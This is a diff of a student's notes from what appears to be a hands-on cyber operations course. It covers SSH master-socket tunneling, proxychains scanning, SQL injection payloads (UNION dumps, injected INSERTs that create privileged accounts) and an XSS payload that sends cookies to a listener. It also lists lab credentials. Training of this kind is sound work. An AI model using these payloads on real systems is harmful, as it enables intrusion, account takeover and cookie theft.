@@ -4,6 +4,7 @@ Stack: Mitton_Ops_Stations
 Pass: standard workstation pass
 Opstations: 10.50.23.139 (Linux), 10.50.26.168 (Windows)
         - Creds: student / password
+ssh student@10.50.23.139 -X
 
 CTFD Server: 10.50.20.103:8000
 Username: LUMI-007-M
@@ -13,47 +14,66 @@ Pass: 5lD3eHz6TtmMSP3
 10.50.33.78/classinfo.html
 Stack #8
 Jump IP: 10.50.22.72
+Student / 5lD3eHz6TtmMSP3
         (ping is the ONLY thing to be run on the jump box)
         (for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done)
 
 Opstation: vta.cybbh.space
 
 
+Jump: 10.10.28.40/27
+192.168.28.97/98/100/105/111/120
 
-192.168.28.97,98,99,100,105,111,120
-97: All closed
-98: 53 (DNS)
-99: 53 (DNS)
-100: 80 (HTTP), 2222 (SSH)
-105: 21 (FTP), 23 (Telnet), 2222 (SSH)
-111: 80 (HTTP), 2222 (SSH), 8080 (HTTP)
-120: 4242 (SSH)
-http://127.0.0.1:1111/admin/login.php
-http://127.0.0.1:1113 (2222 100)
-http://127.0.0.1:4443 (2222 111)
-http://127.0.0.1:4444 (8080 111)
+
+
+' OR 1='1' OR '
+Entry%' UNION SELECT table_schema,column_name FROM information_schema.columns #
+sqlinjection / member / username, password, permission
+1000 OR 1='1'
+1000 AND categories.id = category) AS maxamount FROM categories HAVING maxamount IS NOT NULL UNION SELECT 1,2,3,4 #
+(shows 2 and 4)
+1000 OR 1='1' AND categories.id = category) AS maxamount FROM categories HAVING maxamount IS NOT NULL UNION SELECT name, description, id, price FROM products #
+members
+orderlines
+orders
+payments
+permissions
+share4
+
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Luke', 'Mitton', 'Luke', 'Mitton', 'bob'' OR 1=''1', 3)
+
+YourTempPassword
+
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Cal', 'Hobbs', 'Ooga', 'Booga', 'stuff.com', 1) #', 'sldf', 'sdkfj', 3) 
+
 syntax: run proxychains nmap --script=http-enum.nse [IP] -p [alt HTTP port] to get more stuff
 
-
 I WILL BE EXPECTED TO USE THE NEW TUNNELING METHOD AT 1ST RADBAT:
-
-OPS: ssh -MS /tmp/jump student@10.50.22.72 #Create a master socket on the jump box
-JUMP: for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) ; done #ping sweep
-OPS: ssh -S /tmp/jump -O forward -D 9050 (IP) #on opstation, -S says to use a socket file (the socket file we made at the start of the script to SSH to the jumpbox & set up -D dynamic port fwd.
-OPS: proxychains nmap 192.168.28.100,111 [80,21] #nmap the discovered IPs
-OPS: proxychains nc 192.168.28.[100/111] [80/2222] #get accurate ports for discovered IPs
-OPS: ssh -S /tmp/jump jump -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.100:2222 -L3333:192.168.28.111:80 -L5555:192.168.28.111:2222
-OPS: ss -ntlp
-
-OPS: ssh -S /tmp/jump jump -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.100:2222 -L3333:192.168.28.111:80 -L5555:192.168.28.111:2222
-This creates a tunnel with a single pid across all processes - just a singular TCP connection. TCP connections are a finite resource, so this is valuable! Also, everything happens by one connection only. No confusion.
-#Then type firefox through X11, type in http://127.0.0.1:1111 / http://127.0.0.1:3333
+Starting at opstation, steps:
+SOCKET 1
+OPS: ssh -MS /tmp/jump student@[JUMP IP] #Create a master socket on the jump box
+        JUMP: for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) ; done #ping sweep
+OPS: ssh -S /tmp/jump jump -O forward -D 9050 #on opstation, -S says to use the socket file we made at the start of the script to SSH to the jumpbox & set up -D dynamic port fwd.
+        OPS: proxychains nmap 192.168.28.100,111 [80,21] #nmap the discovered IPs
+        OPS: proxychains nc 192.168.28.[100/111] [80/2222] #get accurate ports for discovered IPs
+OPS: ssh -S /tmp/jump jump -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.100:2222 -L3333:192.168.28.111:80 -L5555:192.168.28.111:2222 #tackin on extra connections onto the master socket
+        #This creates a tunnel with a single pid across all processes - just a singular TCP connection. TCP connections are a finite resource, so this is valuable!
+        #Also, everything happens by one connection only. No confusion.
+        OPS: ss -ntlp
+OPS: firefox #opens Firefox through X11, type in http://127.0.0.1:1111 / http://127.0.0.1:3333
+SOCKET 2
 OPS: ssh -MS /tmp/t1 creds@127.0.0.1 -p 2222 #ssh again, creating a new master socket this time with acquired credentials to the the desired 192.168.28.100 box with an alt SSH port on 2222
+        #this will let you easily get further beyond the .100 box
+OPS: ssh -S /tmp/jump jump -O cancel -D 9050 #cancel the jump proxy
+OPS: ssh -S /tmp/t1 t1 -O forward -D 9050 #start the t1 proxy
 
 
 Nmap scripts: located in /usr/share/nmap/scripts/
 good nmap script for http enumeration: nmap --script=http-enum.nse [IP]
 
+
+python3 -m http.server
+<script>document.location="http://10.50.33.134:8000/"+document.cookie;</script>
 
 
 
